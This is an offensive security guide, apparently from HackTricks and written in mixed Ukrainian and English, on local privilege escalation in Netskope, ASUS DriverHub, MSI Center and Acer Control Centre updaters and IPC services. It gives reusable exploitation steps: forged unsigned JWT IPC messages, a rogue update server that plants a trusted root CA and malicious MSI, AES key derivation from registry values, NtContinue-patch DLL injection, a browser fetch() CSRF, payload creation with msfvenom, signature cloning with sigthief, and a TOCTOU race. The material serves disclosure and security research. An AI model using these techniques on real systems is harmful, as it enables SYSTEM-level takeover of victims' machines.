# Зловживання корпоративними автооновлювачами та привілейованим IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Ця сторінка узагальнює клас Windows local privilege escalation chains, що зустрічаються в корпоративних endpoint агентах та updaters, які відкривають low\-friction IPC surface і привілейований update flow. Репрезентативний приклад — Netskope Client for Windows < R129 (CVE-2025-0309), де low\-privileged user може примусово виконати enrollment на attacker\-controlled server і потім доставити шкідливий MSI, який встановлює служба SYSTEM.

Key ideas you can reuse against similar products:
- Зловживати localhost IPC привілейованого сервісу, щоб примусово виконати re\-enrollment або reconfiguration на attacker server.
- Implement the vendor’s update endpoints, deliver a rogue Trusted Root CA, and point the updater to a malicious, “signed” package.
- Evade weak signer checks (CN allow\-lists), optional digest flags, and lax MSI properties.
- Якщо IPC є “encrypted”, derive the key/IV from world\-readable machine identifiers, збережених у реєстрі.
- Якщо сервіс обмежує виклики за image path/process name, inject into an allow\-listed process або створити процес у suspended стані та bootstrap ваш DLL через мінімальний thread\-context patch.

---
## 1) Forcing enrollment to an attacker server via localhost IPC

Багато агентів постачають user\-mode UI процес, який спілкується зі службою SYSTEM через localhost TCP з використанням JSON.

Спостерігалося в Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Потік експлуатації:
1) Craft a JWT enrollment token whose claims control the backend host (e.g., AddonUrl). Use alg=None so no signature is required.
2) Send the IPC message invoking the provisioning command with your JWT and tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Сервіс починає звертатися до вашого підробленого сервера для enrollment/config, наприклад:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- Якщо caller verification є path/name\-based, ініціюйте запит з allow\-listed vendor binary (see §4).

---
## 2) Перехоплення каналу оновлень для запуску коду як SYSTEM

Коли клієнт починає спілкуватися з вашим сервером, реалізуйте очікувані endpoints і перенаправте його на attacker MSI. Типова послідовність:

1) /v2/config/org/clientconfig → Повернути JSON config з дуже коротким updater interval, наприклад:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Повертає PEM CA certificate. Служба встановлює його в Local Machine Trusted Root store.  
3) /v2/checkupdate → Надає метадані, що вказують на зловмисний MSI та підробну версію.

Bypassing common checks seen in the wild:
- Signer CN allow\-list: служба може перевіряти лише, що Subject CN дорівнює “netSkope Inc” або “Netskope, Inc.”. Ваша зловмисна CA може видати leaf з цим CN і підписати MSI.
- CERT_DIGEST property: включіть у MSI нешкідливу властивість з іменем CERT_DIGEST. Під час встановлення немає примусового виконання перевірки.
- Optional digest enforcement: прапорець конфігурації (наприклад, check_msi_digest=false) вимикає додаткову криптографічну валідацію.

Result: служба SYSTEM встановлює ваш MSI з
C:\ProgramData\Netskope\stAgent\data\*.msi
і виконує довільний код як NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope загорнув IPC JSON у поле encryptData, яке виглядає як Base64. Реверсинг показав AES з key/IV, похідними від значень реєстру, читабельних будь-яким користувачем:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Зловмисники можуть відтворити шифрування і відправляти дійсні зашифровані команди від звичайного користувача. Загальна порада: якщо агент раптово «шифрує» свій IPC, шукайте device IDs, product GUIDs, install IDs під HKLM як матеріал.

---
## 4) Bypassing IPC caller allow\-lists (path/name checks)

Деякі служби намагаються автентифікувати пір, резолвячи PID TCP-з'єднання й порівнюючи шлях/ім'я образу з allow\-listed vendor binaries, розташованими під Program Files (наприклад, stagentui.exe, bwansvc.exe, epdlp.exe).

Two practical bypasses:
- DLL injection into an allow\-listed process (e.g., nsdiag.exe) and proxy IPC from inside it.
- Spawn an allow\-listed binary suspended and bootstrap your proxy DLL without CreateRemoteThread (see §5) to satisfy driver\-enforced tamper rules.

---
## 5) Tamper\-protection friendly injection: suspended process + NtContinue patch

Products often ship a minifilter/OB callbacks driver (e.g., Stadrv) to strip dangerous rights from handles to protected processes:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

A reliable user\-mode loader that respects these constraints:
1) CreateProcess of a vendor binary with CREATE_SUSPENDED.
2) Obtain handles you’re still allowed to: PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the process, and a thread handle with THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (or just THREAD_RESUME if you patch code at a known RIP).
3) Overwrite ntdll!NtContinue (or other early, guaranteed\-mapped thunk) with a tiny stub that calls LoadLibraryW on your DLL path, then jumps back.
4) ResumeThread to trigger your stub in\-process, loading your DLL.

Because you never used PROCESS_CREATE_THREAD or PROCESS_SUSPEND_RESUME on an already\-protected process (you created it), the driver’s policy is satisfied.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automates a rogue CA, malicious MSI signing, and serves the needed endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is a custom IPC client that crafts arbitrary (optionally AES\-encrypted) IPC messages and includes the suspended\-process injection to originate from an allow\-listed binary.

---
## 1) Browser\-to\-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub постачає user\-mode HTTP service (ADU.exe) на 127.0.0.1:53000, який очікує виклики з браузера від https://driverhub.asus.com. Фільтр Origin просто виконує `string_contains(".asus.com")` над заголовком Origin і над download URLs, які відкриває `/asus/v1.0/*`. Будь‑який attacker\-controlled host, такий як `https://driverhub.asus.com.attacker.tld`, тому проходить перевірку і може надсилати запити, що змінюють стан, з JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns.

Практичний flow:
1) Register a domain that embeds `.asus.com` and host a malicious webpage there.
2) Use `fetch` or XHR to call a privileged endpoint (e.g., `Reboot`, `UpdateApp`) on `http://127.0.0.1:53000`.
3) Send the JSON body expected by the handler – the packed frontend JS shows the schema below.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Навіть PowerShell CLI, наведений нижче, спрацьовує, коли заголовок Origin підроблено на довірене значення:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1\-click (or 0\-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code\-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` downloads arbitrary executables defined in the JSON body and caches them in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation reuses the same substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` is accepted. After download, ADU.exe merely checks that the PE contains a signature and that the Subject string matches ASUS before running it – no `WinVerifyTrust`, no chain validation.

To weaponize the flow:
1) Create a payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS’s signer into it (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` on a `.asus.com` lookalike domain and trigger UpdateApp via the browser CSRF above.

Because both the Origin and URL filters are substring\-based and the signer check only compares strings, DriverHub pulls and executes the attacker binary under its elevated context.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’s SYSTEM service exposes a TCP protocol where each frame is `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. The core component (Component ID `0f 27 00 00`) ships `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Its handler:
1) Copies the supplied executable to `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifies the signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL CO., LTD.” and `WinVerifyTrust` succeeds).
3) Creates a scheduled task that runs the temp file as SYSTEM with attacker\-controlled arguments.

The copied file is not locked between verification and `ExecuteTask()`. An attacker can:
- Send Frame A pointing to a legitimate MSI-signed binary (guarantees the signature check passes and the task is queued).
- Race it with repeated Frame B messages that point to a malicious payload, overwriting `MSI Center SDK.exe` just after verification completes.

When the scheduler fires, it executes the overwritten payload under SYSTEM despite having validated the original file. Reliable exploitation uses two goroutines/threads that spam CMD_AutoUpdateSDK until the TOCTOU window is won.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Every plugin/DLL loaded by `MSI.CentralServer.exe` receives a Component ID stored under `HKLM\SOFTWARE\MSI\MSI_CentralServer`. The first 4 bytes of a frame select that component, allowing attackers to route commands to arbitrary modules.
- Plugins can define their own task runners. `Support\API_Support.dll` exposes `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` and directly calls `API_Support.EX_Task::ExecuteTask()` with **no signature validation** – any local user can point it at `C:\Users\<user>\Desktop\payload.exe` and get SYSTEM execution deterministically.
- Sniffing loopback with Wireshark or instrumenting the .NET binaries in dnSpy quickly reveals the Component ↔ command mapping; custom Go/ Python clients can then replay frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exposes `\\.\pipe\treadstone_service_LightMode`, and its discretionary ACL allows remote clients (e.g., `\\TARGET\pipe\treadstone_service_LightMode`). Sending command ID `7` with a file path invokes the service’s process-spawning routine.
- The client library serializes a magic terminator byte (113) along with args. Dynamic instrumentation with Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) shows that the native handler maps this value to a `SECURITY_IMPERSONATION_LEVEL` and integrity SID before calling `CreateProcessAsUser`.
- Swapping 113 (`0x71`) for 114 (`0x72`) drops into the generic branch that keeps the full SYSTEM token and sets a high-integrity SID (`S-1-16-12288`). The spawned binary therefore runs as unrestricted SYSTEM, both locally and cross-machine.
- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without vendor hardware.

These IPC bugs highlight why localhost services must enforce mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) and why every module’s “run arbitrary binary” helper must share the same signer verifications.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)

{{#include ../../banners/hacktricks-training.md}}
